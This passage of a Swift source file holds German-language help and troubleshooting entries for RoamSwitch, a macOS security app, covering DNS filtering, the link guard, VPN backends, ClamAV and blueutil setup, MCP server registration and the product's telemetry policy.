                • Einstellung: „DNS-Bedrohungsschutz (Malware & C2 blockieren) (Pro)“ → „DNS-Anbieter: …“ und „⚙️ Anwendungsrichtlinie“.
                • Anbieter: Quad9 (Malware & C2 automatisch blockieren) / Cloudflare Security (1.1.1.2) / AdGuard DNS (Bedrohungen & Werbung blockieren) / CleanBrowsing (Sicherheitsfilter).
                • Richtlinie: „Nur bei nicht vertrauenswürdigem Wi-Fi (empfohlen)“ oder „Immer auf allen Netzwerken aktiv (inkl. vertrauenswürdig)“. Bei „Nur unterwegs“ werden in vertrauenswürdigen Netzwerken die ursprünglichen DNS-Einstellungen wiederhergestellt.
                • Der Statuspunkt im Menü öffnet die Netzwerkeinstellungen, damit Sie prüfen können, was angewendet ist.
                """,
                recommendation: "Für die meisten ist Quad9 mit der Richtlinie „Nur unterwegs“ eine gute Wahl. Vermeiden Sie die Immer-aktiv-Richtlinie, wenn Sie internes Firmen-DNS benötigen."
            ),
            LocalizedEntry(
                id: "set_link_guard_modes",
                title: "Modus, Auto-Update, Systemerweiterung & vorübergehendes Erlauben des Link-Schutzes (Pro)",
                summary: "Konfigurieren Sie den Modus des Link-Schutzes, das automatische Update der Bedrohungsliste, den Genehmigungsstatus der Systemerweiterung sowie den Umgang mit versehentlich blockierten Seiten.",
                details: """
                • Modus: „Link-Schutz (Phishing-Verbindungserkennung) (Pro)“ → „Aus“, „Nur warnen (nie blockieren)“ oder „Eindeutige Phishing-Seiten automatisch blockieren (empfohlen)“. Der Warnmodus funktioniert nur, wenn die Systemerweiterung aktiv ist.
                • Auto-Update: Klicken Sie auf „Auto-Update: an (nur Empfang)“, um es auszuschalten. Es funktioniert weiterhin mit den mitgelieferten Daten und der Homograph-Erkennung. Listenversion und Domainanzahl werden im Menü angezeigt.
                • Durchsetzungspunkt: „Durchsetzung: Systemerweiterung (DoH-fähig)“, „Durchsetzung: hosts-Fallback“, „Systemerweiterung wird aktiviert…“ oder ein Fehler der Systemerweiterung. Während die Genehmigung aussteht, erscheint „Systemerweiterung genehmigen (Systemeinstellungen öffnen)…“.
                • Erlauben/Blockieren: „Einmal erlauben (5 Min.)“ bei einer Blockierungsbenachrichtigung und „Erlauben“ im Warnfenster erlauben die Seite jeweils nur für 5 Minuten; die Erlaubnis endet pünktlich, auch wenn die App beendet und neu geöffnet wird. „Blockieren“ im Warnfenster wird gespeichert.
                """,
                recommendation: "Genehmigen Sie die Systemerweiterung und nutzen Sie die automatische Blockierung mit eingeschaltetem Auto-Update für den wirksamsten Schutz."
            ),
            LocalizedEntry(
                id: "set_vpn_backend",
                title: "Backend-Einstellungen des VPN-Tunnels (WireGuard / Tailscale) (Pro)",
                summary: "Wählen Sie das Backend des VPN-Tunnels, importieren Sie eine WireGuard-Konfiguration, wählen Sie einen Tailscale-Exit-Node und konfigurieren Sie den Kill-Switch.",
                details: """
                • Öffnen: „Port- & Geräteüberwachung“ → „VPN-Tunnel (Anti-MITM in nicht vertrauenswürdigen Netzwerken) (Pro)“ → „Backend“.
                • WireGuard: „WireGuard-Konfiguration (.conf) importieren…“ → „Auto-Verbindung in nicht vertrauenswürdigen Netzwerken“. Zusätzlich „Jetzt verbinden“, „Trennen“ und „Konfiguration entfernen“. Der Status zeigt z. B. „🟢 Verbunden (letzter Handshake vor N s)“, der Kill-Switch ist immer aktiv. Fehlt `wireguard-tools`, erscheint eine Einrichtungsanleitung.
                • Tailscale: Wählen Sie unter „Exit-Node“ einen Knoten aus („(keiner — Schutz aus)“ zum Deaktivieren). Zusätzlich „Kandidaten aktualisieren“ und „Status aktualisieren“. „Kill-Switch: an (Leck-Schutz)“ ist optional und standardmäßig aus.
                • Beispiel-Statuszeilen: „⚪️ Standby (verbindet automatisch in nicht vertrauenswürdigen Netzwerken)“, „🟡 Ausgewählter Exit-Node ist offline“.
                """,
                recommendation: "Nutzen Sie bereits Tailscale, wählen Sie Tailscale; andernfalls ist die WireGuard-Konfiguration Ihres VPN-Anbieters die einfachste Option."
            ),
            LocalizedEntry(
                id: "set_language",
                title: "Anzeigesprache (App- und MCP-Antworten)",
                summary: "RoamSwitch kann in 10 Sprachen angezeigt werden (日本語, English, 简体中文, 繁體中文, 한국어, Deutsch, Français, Español, Italiano, Português). MCP-Server-Antworten und diese Wissensdatenbank nutzen dieselbe Sprache.",
                details: """
                • Einstellung: Wählen Sie im Menü unter „Sprache / Language“. „Systemeinstellung folgen“ nutzt die bevorzugte Sprache von macOS.
                • MCP: Der MCP-Server liest die in der App gewählte Sprache. Folgt er dem System und wird die Systemsprache nicht unterstützt, antwortet er auf Englisch.
                • Das Tool `get_app_help` nimmt ein `language`-Argument entgegen, um die Antwortsprache pro Aufruf zu wählen. Suchen finden Schlüsselwörter in jeder Sprache.
                """,
                recommendation: "Um mit Ihrem KI-Assistenten in einer anderen Sprache als der App zu sprechen, nutzen Sie das `language`-Argument von `get_app_help`."
            ),
        ]
    }

    // MARK: - Troubleshooting: setup

    private static func troubleshootingDeSetup() -> [LocalizedEntry] {
        return [
            LocalizedEntry(
                id: "faq_free_vs_pro",
                title: "Unterschied zwischen kostenloser Version und Pro-Dauerversion",
                summary: "Die kostenlose Version umfasst zeitlich unbegrenzt die automatische netzwerkbasierte Schutzumschaltung, die 23-Punkte-Sicherheitsprüfung sowie eine Reihe manueller Prüfwerkzeuge. Pro schaltet automatische Eindämmung, Echtzeitschutz und Patrouillenwarnungen frei.",
                details: """
                [Kostenlos]
                • Automatische 3-stufige PF-Paketfilter-Umschaltung je Netzwerk, mit automatischem Stopp und Wiederherstellen von Freigabediensten und AirDrop
                • Mac-Sicherheitsprüfung (23 Punkte), XProtect-Status sowie Datei-/App-Sicherheitsprüfung
                • Listen offengelegter Ports und USB-Geräte
                • Link-Sicherheitsprüfung, manuelle Geheimnis-/API-Key-Leck-Prüfung, Zwischenablage-Schutz
                • Paket-CVE-Scan, aktive Schwachstellenverifizierung, Mac-Sicherheitsprotokoll-Audit, Benachrichtigungsverlauf
                • Manuelle ClamAV-Scans und Quarantäneverwaltung
                • MCP-Server-Integration
                [Pro-Dauerversion (einmalig ¥2.980 / 19,99 $, bis zu 2 Macs)]
                • Ransomware-Köderdatei-Erkennung mit Air-Gap, XProtect-gebundene automatische Trennung, ClickFix-Schutz
                • Automatische Blockierung unbekannter Listening-Ports, Isolation von Entwicklungsservern
                • ARP-Spoofing-Auto-Blockierung, Gateway-ARP/NDP-Fixierung, VPN-Tunnel (WireGuard / Tailscale), Evil-Twin-Warnungen
                • BadUSB-Tastaturschutz, automatische Blockierung von USB-Speicher
                • Web- & E-Mail-Schutz (automatisches Scannen, Quarantäne, Pickle-Warnungen), DNS-Bedrohungsschutz, Link-Schutz
                • Überwachung von Autostart-Registrierungen, Docker-Risikoerkennung, Überwachung wichtiger Dateien auf Manipulation, automatische Protokollprüfung
                • Automatisches Bluetooth-Aus, Echtzeit-Bedrohungsbenachrichtigungen, Patrouillenwarnungen, Definitionsaktualisierungen und geplante Scans, CSV-Export von Protokollen
                """,
                recommendation: "Wählen Sie Pro, wenn Sie automatische Eindämmung, Echtzeitschutz und Hintergrundüberwachung benötigen."
            ),
            LocalizedEntry(
                id: "faq_homebrew_clamav",
                title: "ClamAV (Virenscan) und Homebrew einrichten",
                summary: "Der Virenscan nutzt das quelloffene ClamAV, installierbar über Homebrew. Ohne Installation funktionieren die XProtect-Integration und alle Eigenfunktionen von RoamSwitch weiterhin.",
                details: """
                • Homebrew: Der Paketmanager für macOS (https://brew.sh/).
                • Schritte:
                  1. Führen Sie im Terminal Homebrews offiziellen Installationsbefehl aus (angezeigt unter https://brew.sh/).
                  2. Führen Sie `brew install clamav` aus. „📥 ClamAV über Homebrew installieren…“ im Menü öffnet ebenfalls eine Anleitung.
                  3. Wählen Sie „🛡️ ClamAV (Kostenloses Antivirus)“ → „🔄 Virusdatenbank jetzt aktualisieren“.
                • Durch ClamAV aktiviert: Schnellscan (Downloads/Schreibtisch), Ordnerscan, Scans im Web- & E-Mail-Schutz und bei USB-Speicher sowie der geplante Scan der Patrouille.
                • Ohne ClamAV: Paketfilterung, Portüberwachung, Link-Analyse, statische Signaturprüfung und mehr funktionieren weiterhin.
                """,
                recommendation: "Installieren Sie Homebrew und ClamAV, wenn Downloads und USB-Speicher automatisch gescannt werden sollen."
            ),
            LocalizedEntry(
                id: "faq_blueutil_setup",
                title: "Automatisches Bluetooth-Aus (Pro) und blueutil-Einrichtung",
                summary: "Das automatische Ausschalten von Bluetooth unterwegs erfordert das quelloffene Werkzeug `blueutil`.",
                details: """
                • Hintergrund: macOS bietet keine öffentliche API, mit der Apps die Bluetooth-Energieversorgung umschalten können, daher wird das CLI-Werkzeug `blueutil` genutzt.
                • Schritte:
                  1. Führen Sie im Terminal `brew install blueutil` aus (oder nutzen Sie „📥 blueutil über Homebrew installieren…“ im Menü).
                  2. Aktivieren Sie „Port- & Geräteüberwachung“ → „Bluetooth bei nicht vertrauenswürdigen Netzwerken automatisch ausschalten (Pro)“.
                • Ohne Installation: Nichts anderes wird beeinträchtigt, das Menü zeigt „🔵 Bluetooth-Auto-Aus (nicht installiert)“.
                """,
                recommendation: "Um Funk-Tracking und Bluetooth-Schwachstellen in öffentlichem WLAN zu vermeiden, führen Sie `brew install blueutil` aus und aktivieren Sie die Funktion."
            ),
            LocalizedEntry(
                id: "faq_helper_troubleshooting",
                title: "Was tun, wenn „⚠️ Helfer nicht verbunden“ erscheint",
                summary: "Wiederherstellungsschritte, wenn RoamSwitch nicht mit dem privilegierten Helferwerkzeug (RoamSwitchHelper) kommunizieren kann.",
                details: """
                1. Wählen Sie im Menü „⚠️ Helfer genehmigen…“ und folgen Sie den angezeigten Schritten.
                2. Öffnen Sie Systemeinstellungen → Allgemein → Anmeldeobjekte & Erweiterungen und stellen Sie sicher, dass RoamSwitchHelper unter „Ausführung im Hintergrund erlauben“ aktiv ist.
                3. Vergewissern Sie sich, dass RoamSwitch im Programme-Ordner liegt (faq_install_location).
                4. Klicken Sie im Onboarding-Fenster auf „Helfer-Registrierung wiederholen“.
                5. Schlägt es weiterhin fehl, führen Sie im Terminal `sudo killall RoamSwitchHelper` aus, um den Helfer neu zu starten (launchd startet ihn automatisch neu), und starten Sie RoamSwitch anschließend neu.
                """,
                recommendation: "Reagiert der Helfer direkt nach einem macOS-Update nicht mehr, prüfen Sie zuerst den Schalter bei den Anmeldeobjekten und versuchen Sie dann `sudo killall RoamSwitchHelper`."
            ),
            LocalizedEntry(
                id: "faq_install_location",
                title: "App-Speicherort (Start außerhalb des Programme-Ordners)",
                summary: "macOS registriert den privilegierten Helfer nicht für eine App außerhalb des Programme-Ordners, daher muss RoamSwitch in `/Applications` oder `~/Applications` liegen und von dort gestartet werden.",
                details: """
                • Orte ohne Registrierung: Downloads oder Schreibtisch, Ausführung aus einem noch eingebundenen Disk-Image (.dmg), oder wenn Gatekeeper App Translocation die App an einen temporären, schreibgeschützten Ort verschoben hat.
                • Anleitung: Das Onboarding prüft den Speicherort beim Start und bietet „In „Programme“ verschieben & neu starten“ oder „„Programme“ im Finder öffnen“ an.
                • Nach dem Verschieben: Klicken Sie „Erneut prüfen“ oder starten Sie neu, dann genehmigen Sie den Helfer.
                """,
                recommendation: "Ziehen Sie RoamSwitch aus dem Disk-Image in den Programme-Ordner und starten Sie es von dort."
            ),
            LocalizedEntry(
                id: "faq_system_extension_approval",
                title: "Systemerweiterung des Link-Schutzes genehmigen",
                summary: "Damit der Link-Schutz optimal funktioniert (DoH-fähig, Warnmodus), muss die Content-Filter-Systemerweiterung genehmigt werden. Bis dahin nutzt er die /etc/hosts-Notlösung.",
                details: """
                • Schritte: „Link-Schutz (Phishing-Verbindungserkennung) (Pro)“ → „Systemerweiterung genehmigen (Systemeinstellungen öffnen)…“ → Systemeinstellungen → Allgemein → Anmeldeobjekte & Erweiterungen, dann RoamSwitchs Netzwerkerweiterung erlauben.
                • Nach der Genehmigung: Das Menü zeigt „Durchsetzung: Systemerweiterung (DoH-fähig)“.
                • Erscheint ein Fehler der Systemerweiterung: Prüfen Sie, ob die App im Programme-Ordner liegt, und wählen Sie den Link-Schutz-Modus erneut, um es erneut zu versuchen.
                • Diese Methode benötigt keine App-Store-Prüfung oder gesonderte Berechtigungsanfrage (Developer-ID-signiert und notarisiert).
                • Falls Sie die Freigabe vergessen haben: Nach 10 Minuten Wartezeit erhalten Sie eine Mitteilung, und der Menüeintrag Linkschutz erhält ein 🟡. Über „Systemerweiterung freigeben (Systemeinstellungen öffnen) …“ im Menü können Sie die Seite jederzeit öffnen. Bis zur Freigabe gilt nur die Liste in /etc/hosts.
                """,
                recommendation: "Genehmigen Sie die Systemerweiterung, damit der Schutz auch dann greift, wenn Ihr Browser DNS over HTTPS nutzt."
            ),
            LocalizedEntry(
                id: "faq_mcp_setup",
                title: "MCP-Server einrichten (Claude Desktop, Claude Code u. a.)",
                summary: "So registrieren Sie den in RoamSwitch enthaltenen MCP-Server bei einem MCP-fähigen KI-Client.",
                details: """
                • Programmpfad: `/Applications/RoamSwitch.app/Contents/MacOS/RoamSwitchMCPServer`
                • Claude Desktop: Fügen Sie den Programmpfad als `command` unter `mcpServers` in `~/Library/Application Support/Claude/claude_desktop_config.json` hinzu.
                • Claude Code: `claude mcp add roamswitch /Applications/RoamSwitch.app/Contents/MacOS/RoamSwitchMCPServer`
                • Andere Clients (Codex CLI u. a.): https://roamswitch.com/mcp-setup.html
                • Antwortsprache: Folgt der Einstellung „Sprache / Language“ der App. `get_app_help` akzeptiert pro Aufruf ein `language`-Argument.
                • Die Kommunikation mit dem MCP-Server erfolgt ausschließlich über lokales stdio. Das einzige MCP-Tool, das einen externen Host kontaktiert, ist das Opt-in- und Pro-exklusive `run_npm_audit_signatures` (npm-Registry). `run_active_vuln_scan` sondiert 127.0.0.1, und `get_exposed_ports` sendet pro offenem Port einen HTTP-GET an 127.0.0.1, um die Header zu lesen. Die Diagnose-Tools senden unter Umständen einen ICMP-Ping an das Standard-Gateway im LAN, um dessen MAC-Adresse zu ermitteln.
                """,
                recommendation: "Nach der Registrierung können Sie Ihre KI etwa fragen: „Prüfe mit RoamSwitch den Sicherheitszustand meines Mac“, und sie erklärt Ihnen die Prüfungsergebnisse."
            ),
        ]
    }

    // MARK: - Troubleshooting: operation

    private static func troubleshootingDeOperation() -> [LocalizedEntry] {
        return [
            LocalizedEntry(
                id: "faq_network_cut_off",
                title: "Das Internet funktioniert plötzlich nicht mehr (Air-Gap-Eindämmung / Schutzstufe)",
                summary: "RoamSwitchs Notfall-Air-Gap oder die Maximale Sperre könnten den Datenverkehr stoppen. So finden und heben Sie die Ursache auf.",
                details: """
                • Prüfen: Suchen Sie nach einem Notfallfenster und prüfen Sie den Benachrichtigungsverlauf auf Alarme wie KRITISCHE AUTOMATISCHE ABWEHR, XProtect, ARP-Spoofing oder verdächtige Befehlsausführung. Auch der WLAN-Funk könnte ausgeschaltet worden sein.
                • Aufheben: Nutzen Sie die Aufheben-Schaltfläche im Notfallfenster oder der Benachrichtigung. Netzwerk und WLAN-Funk kehren zurück.
                • Automatische Wiederherstellung: Bei geringer Sicherheit (z. B. ClickFix) stellt das Sicherheitsnetz des Helfers die Netzwerkverbindung auch ohne Aufheben innerhalb von 10 Minuten wieder her. Bei hoher Sicherheit (Ransomware-Köderdatei, XProtect-Fund) öffnet sich das Netzwerk nicht von selbst: Nach bis zu 1 Stunde folgt der eingeschränkte Modus, bis Sie im Notfallfenster oder in der Benachrichtigung aufheben oder die Ursache als beseitigt bestätigt wird. Das gilt auch nach Beenden, Absturz oder Neustart.
                • Direkt nach dem Start: Der Datenverkehr kann durch das Boot-Gate bis zu 90 Sekunden eingeschränkt sein.
                • Andere Ursachen: Maximale Sperre blockiert eingehenden Verkehr, verhindert aber nicht die normale ausgehende Nutzung wie Websurfen. Prüfen Sie auch den VPN-Kill-Switch (während der Tunnel unten ist), den Resolver des DNS-Bedrohungsschutzes und Blockierungen des Link-Schutzes.
                """,
                recommendation: "Löst die Eindämmung aus, lesen Sie die auslösende Benachrichtigung und heben Sie sie auf, sobald Sie die Sicherheit bestätigt haben. Löst eine Schutzfunktion häufig fälschlich aus, können Sie sie im Menü einzeln deaktivieren."
            ),
            LocalizedEntry(
                id: "faq_quarantine_false_positive",
                title: "Einen versehentlich isolierten Download wiederherstellen",
                summary: "So stellen Sie Ihr eigenes Skript oder eine Entwicklungs-Binärdatei wieder her, die als Fehlalarm isoliert wurde, und schließen sie von künftigen Scans aus.",
                details: """
                1. Öffnen Sie Malware-Schutz → ClamAV → „📦 Quarantänedateien verwalten…“.
                2. Wählen Sie die Datei unter den isolierten Dateien aus (ursprünglicher Pfad, Bedrohungsname und Zeitpunkt der Quarantäne werden angezeigt).
                3. Bei einem sicheren Fehlalarm klicken Sie „Ausschließen & wiederherstellen“: Sie kehrt an ihren ursprünglichen Ort zurück, und der Pfad wird von künftigen Scans ausgeschlossen. Um nur einmalig wiederherzustellen, klicken Sie „Wiederherstellen“.
                4. Um einen Ausschluss rückgängig zu machen, klicken Sie im selben Fenster in der Liste der ausgeschlossenen Pfade auf „Ausschluss aufheben“.
                5. Um die Überwachung eines ganzen Ordners zu stoppen, passen Sie „⚙️ Überwachte Ordner verwalten…“ unter Web- & E-Mail-Schutz an.
                """,
                recommendation: "Sind Sie sich bei einer Datei nicht sicher, stellen Sie sie nicht wieder her; wählen Sie stattdessen Endgültig löschen."
            ),
            LocalizedEntry(
                id: "faq_eicar_test",
                title: "Ich habe eine EICAR-Testdatei platziert, aber keine Benachrichtigung erhalten",
                summary: "Das ist beabsichtigt. Die EICAR-Testsignatur ist ein harmloser Test, daher erscheint kein Banner, und nichts wird isoliert. Die Erkennung wird im Benachrichtigungsverlauf vermerkt.",
                details: """
                • So bestätigen Sie es: Prüfen Sie unter Mac-Sicherheitsprüfung → „🔔 Benachrichtigungsverlauf…“ auf „🧪 EICAR-Testsignatur erkannt (harmlos)“.
                • Die Datei: Bleibt, wo sie ist.
                • Um den echten Alarmpfad zu testen: Nutzen Sie die Simulationen unten in Malware-Schutz (Ransomware-Abwehr, Malware-Erkennungs-Air-Gap, Docker-Risikoerkennung).
                """,
                recommendation: "Löschen Sie die EICAR-Datei, sobald Sie den Test abgeschlossen haben."
            ),
            LocalizedEntry(
                id: "faq_dev_server_blocked",
                title: "Mein Entwicklungsserver oder meine LAN-Empfangs-App ist von anderen Geräten nicht erreichbar",
                summary: "Die automatische Blockierung unbekannter Listening-Ports blockiert möglicherweise ein Programm, das gerade begonnen hat, einen Port zu exponieren. Vom Mac selbst bleibt er erreichbar.",
                details: """
                • Prüfen: Suchen Sie im Benachrichtigungsverlauf nach „Unbekannten Listening-Port automatisch blockiert“.
                • Erlauben: Nutzen Sie die Schaltfläche „Erlauben“ in der Benachrichtigung oder gehen Sie zu Freigegebene Ports → der Port → der Port-Prüfbildschirm. Das Erlauben gilt dauerhaft, je ausführbarer Datei.
                • Im Vergleich zur manuellen Isolation: Einen Port, den Sie selbst mit „Port isolieren“ isoliert haben, stellen Sie im Port-Prüfbildschirm mit „Isolation aufheben“ wieder her.
                • Schutzstufe: In einem Netzwerk mit Maximaler Sperre blockiert die Firewall eingehende Verbindungen vollständig. Um Zugriff aus dem LAN zu erlauben, registrieren Sie das Netzwerk und setzen Sie es auf Ausgewogen oder Vertrauenswürdig.
                """,
                recommendation: "Erlauben Sie regelmäßig genutzte LAN-Empfangs-Apps wie LocalSend oder Syncthing einmal, danach werden sie nicht erneut blockiert."
            ),
            LocalizedEntry(
                id: "faq_link_guard_false_block",
                title: "Der Link-Schutz blockiert eine legitime Seite / hält eine Verbindung dauerhaft an",
                summary: "Was zu tun ist, wenn der Link-Schutz versehentlich eine Seite blockiert oder sie im Warnmodus anhält.",
                details: """
                • Vorübergehend erlauben: „Einmal erlauben (5 Min.)“ bei der Blockierungsbenachrichtigung oder „Erlauben“ im Warnfenster. Beides gilt 5 Minuten.
                • Gespeicherte Wahl: Nur „Blockieren“ im Warnfenster wird gespeichert. „Erlauben“ gilt 5 Minuten.
                • Eine angehaltene Verbindung wurde von selbst blockiert: Der Warnmodus blockiert, wenn innerhalb von etwa 8 Sekunden keine Antwort erfolgt (schließt bei Ausfall). Dieses Ergebnis wird nicht zwischengespeichert, sodass ein erneutes Laden der Seite erneut fragt.
                • Die Benachrichtigung ist nicht sichtbar: Beim Banner-Benachrichtigungsstil können Schaltflächen verborgen sein, daher erscheint zusätzlich ein Fenster im Vordergrund. Prüfen Sie während des Fokus-Modus den Benachrichtigungsverlauf.
                • Vorübergehend deaktivieren: Wechseln Sie den Modus zu „Nur warnen (nie blockieren)“ oder „Aus“.
                """,
                recommendation: "Wird ein Arbeitswerkzeug wiederholt blockiert, prüfen Sie die Domain vor dem Erlauben auf Tippfehler oder Ähnlichkeiten."
            ),
            LocalizedEntry(
                id: "faq_keyboard_blocked",
                title: "Meine externe Tastatur schreibt nicht (BadUSB-Schutz)",
                summary: "Der physische BadUSB-Portschutz blockiert die Eingabe einer nicht auf der Positivliste stehenden Tastatur, bis Sie sie genehmigen.",
                details: """
                • Genehmigen: Klicken Sie im Fenster „⚠️ Unbekanntes USB-Gerät / Tastatur erkannt“ auf „Vertrauen & Erlauben“ (nutzen Sie die eingebaute Tastatur oder das Trackpad).
                • Fenster nicht auffindbar: Trennen und schließen Sie das Gerät erneut an, um es wieder anzuzeigen.
                • Docks und KVM-Switches: Geräte mit eingebauter Tastaturfunktion sind ebenfalls erfasst. Erlauben Sie sie, wenn es Ihre eigenen sind.
                • Bedienungshilfen-Berechtigung: Die Ersatzblockierung, die genutzt wird, wenn das Gerät nicht beschlagnahmt werden kann, stützt sich auf die Bedienungshilfen-Berechtigung.
                • Widerrufen: Entfernen Sie es unter „USB / BadUSB-Schutzeinstellungen…“.
                """,
                recommendation: "Erlauben Sie kein Gerät, das die Skript-Eingabe-Warnung ausgelöst hat; trennen Sie es."
            ),
            LocalizedEntry(
                id: "faq_vpn_troubleshooting",
                title: "Der VPN-Tunnel verbindet sich nicht / kein Datenverkehr geht durch",
                summary: "Was zu prüfen ist, wenn das WireGuard- oder Tailscale-Backend nicht funktioniert.",
                details: """
                • WireGuard: Bestätigen Sie, dass `brew install wireguard-tools` installiert und eine `.conf` importiert ist. Zeigt der Status „🟡 Keine Antwort (letzter Handshake …)“, prüfen Sie den VPN-Server sowie Schlüssel und Endpunkt der Konfiguration. Der Kill-Switch ist aktiv, sodass nichts durchgeht, bis der Tunnel aufgebaut ist.
                • Tailscale: Bestätigen Sie, dass die CLI installiert und angemeldet ist (sonst zeigt das Menü „Zuerst bei Tailscale anmelden“) und ein Exit-Node gewählt ist. Ist der gewählte Exit-Node offline, wählen Sie einen anderen.
                • Tailscale aus dem App Store: Der Exit-Node kann nicht von außerhalb der App gesetzt werden, wählen Sie ihn in der Tailscale-App.
                • Tailscale-Kill-Switch: Kann in manchen Netzwerken Tailscales eigene Konnektivität stören; schalten Sie ihn aus, wenn keine Verbindung zustande kommt.
                • Dass sich die Verbindung in vertrauenswürdigen Netzwerken automatisch trennt, ist erwartetes Verhalten.
                """,
                recommendation: "Beginnen Sie mit der Statuszeile im Menü: dem Handshake bei WireGuard, dem Exit-Node-Zustand bei Tailscale."
            ),
            LocalizedEntry(
                id: "faq_log_audit_repeated_alerts",
                title: "Benachrichtigungen der Protokollprüfung kommen ständig",
                summary: "Die automatische Protokollprüfung lernt während des Laufens das normale Protokollverhalten dieses Mac. Direkt nach der Einrichtung oder einem größeren Update nehmen Meldungen zu und klingen mit fortschreitendem Lernen von selbst ab.",
                details: """
                • Neue Muster: Einmal gemeldet, gilt ein Muster als bekannt und wird für denselben Inhalt nicht erneut gemeldet.
                • Häufigkeitsspitzen: Das Lernen jedes Musters ist nach 3 Beobachtungen abgeschlossen; danach löst normales Aufkommen keinen Alarm mehr aus. Zeigt die Benachrichtigung noch etwas wie „Häufigkeits-Baseline lernt noch: bisher 2/3 Beobachtungen“, wird noch gelernt.
                • Häufige Ursachen: macOS- oder App-Updates, das Anschließen neuer Geräte, vorübergehend hohe Last.
                • Zum Stoppen: Deaktivieren Sie im Menü „Automatische Protokollprüfung (lernt neue Muster & Häufigkeitsanomalien nach Zeitplan) (Pro)“ (die manuelle Protokollprüfung bleibt verfügbar).
                """,
                recommendation: "Solange Meldungen keine unbekannten App-Namen, IP-Adressen oder sudo-Fehlversuche enthalten, können Sie ruhig eine Weile abwarten."
            ),
            LocalizedEntry(
                id: "faq_zero_telemetry",
                title: "Zero-Telemetry-Datenschutzkonzept",
                summary: "RoamSwitch und sein MCP-Server senden niemals Prüfungsergebnisse, URLs, Portinformationen, Protokolle oder Dateiinhalte an externe Server. Der einzige Netzwerkverkehr sind die unten genannten ausdrücklichen Ausnahmen.",
                details: """
                • Vollständig lokal: Sicherheitsprüfung, Portüberwachung, Link-Analyse, Geheimnis-Prüfung, Protokoll-Audit, Virenscan und MCP-Kommunikation bleiben allesamt auf dem Gerät.
                • Ausnahmen:
                  - Lizenzaktivierung und -deaktivierung (nur wenn Sie handeln) sowie das Öffnen der Kaufseite
                  - App-Updateprüfungen (Sparkle)
                  - ClamAV-Definitionsaktualisierungen (`freshclam`)
                  - Auflösen verkürzter URLs in der Link-Prüfung (ruft die Ziel-URL selbst auf; nichts geht an eine Analyse-API oder den Entwickler)
                  - Downloads der Link-Schutz-Bedrohungsliste, der Paket-CVE-Karten und der Schwachstellen-CVE-Karten (die Liste täglich, die Karten etwa einmal pro Woche; rein empfangend, signaturgeprüft, ohne Übertragung von Kennungen; das Auto-Update des Link-Schutzes lässt sich ausschalten)
                  - Normaler Datenverkehr zu den von Ihnen konfigurierten VPN- und sicheren DNS-Anbietern
                  - Nicht-destruktive Sondierungen der aktiven Schwachstellenverifizierung an 127.0.0.1 (diesen Mac selbst)
                  - Die npm-Signaturprüfung (Opt-in, nur Pro) kontaktiert beim Ausführen registry.npmjs.org
                • Es gibt nirgendwo im Code eine Telemetrie oder Nutzungserfassung. Sogar die Erinnerung zur Helfer-Genehmigung funktioniert nur mit einer geräteinternen Zählung.
                """,
                recommendation: "Es ist auch in hochvertraulichen Geschäftsumgebungen und persönlichen Entwicklungsumgebungen bedenkenlos nutzbar, ohne Sorge vor Datenlecks."
            ),
        ]
    }
}
